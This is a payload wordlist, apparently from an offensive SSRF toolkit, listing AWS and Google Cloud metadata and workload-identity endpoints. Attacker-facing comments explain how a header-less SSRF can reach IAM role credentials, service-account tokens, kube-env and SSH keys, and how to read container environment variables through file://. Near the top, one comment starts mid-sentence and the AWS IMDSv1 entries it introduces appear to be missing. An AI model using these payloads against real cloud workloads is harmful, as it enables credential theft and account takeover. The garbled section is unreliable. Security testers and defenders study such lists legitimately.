# cloud-metadata-endpoints.txt — instance metadata and workload-identity endpoints
#
# Used by: nimbus metadata-ssrf skill, metadata-probe.sh, and every SSRF playbook that hands off
# to ssrf-cloud-metadata. Bare URLs only on non-comment lines, so `grep -v '^#'` still yields a
# clean list.
#
# FINGERPRINT THE PROVIDER FIRST. The same link-local address is used by several providers with
# completely different path layouts, and two use different addresses entirely. Firing every path
# at every host is noisy and tells you nothing.
#
# HEADER REQUIREMENTS ARE THE KEY CONSTRAINT. A GET-only SSRF primitive cannot set a request
# header, so the header-free paths below are the ones that matter to it. A primitive that CAN set
# a method and a header (webhook with custom headers, a renderer executing JavaScript, header
# injection) reaches everything.

# changed. Always try this first.

http://instance-data/latest/meta-data/
http://[fd00:ec2::254]/latest/meta-data/
# IMDSv2: token handshake. Needs PUT + a TTL header, then a GET carrying the token header.
#   PUT http://169.254.169.254/latest/api/token
#     X-aws-ec2-metadata-token-ttl-seconds: 21600
#   GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
#     X-aws-ec2-metadata-token: <token>
# The hop limit only defeats SSRF originating a hop away (a container behind a bridge, a network
# proxy). An SSRF in application code ON the instance is the first hop and is unaffected.
http://169.254.169.254/latest/api/token

# ---------- AWS container and serverless runtimes ----------
# ECS/Fargate task role credentials. Plain GET, no header. The relative URI comes from the
# AWS_CONTAINER_CREDENTIALS_RELATIVE_URI environment variable, readable via file:///proc/self/environ
# where the primitive supports file://.
http://169.254.170.2/v2/credentials/
http://169.254.170.2/v2/metadata
http://169.254.170.2/v2/stats
# ECS task metadata v4 endpoint (address supplied via ECS_CONTAINER_METADATA_URI_V4)
http://169.254.170.2/v4/metadata
# EKS Pod Identity agent
http://169.254.170.23/v1/credentials
# Lambda runtime API — reachable from inside the execution environment
http://127.0.0.1:9001/2018-06-01/runtime/invocation/next
# Elastic Beanstalk — recover accountId and region from the identity document, then the role
http://169.254.169.254/latest/dynamic/instance-identity/document

# ---------- Google Cloud ----------
# v1 requires the header  Metadata-Flavor: Google
# v1beta1 historically did NOT — that is the path a header-less primitive wants. Appending a
# JSON format parameter also forces a renderable response, which matters for screenshot/PDF channels.

http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
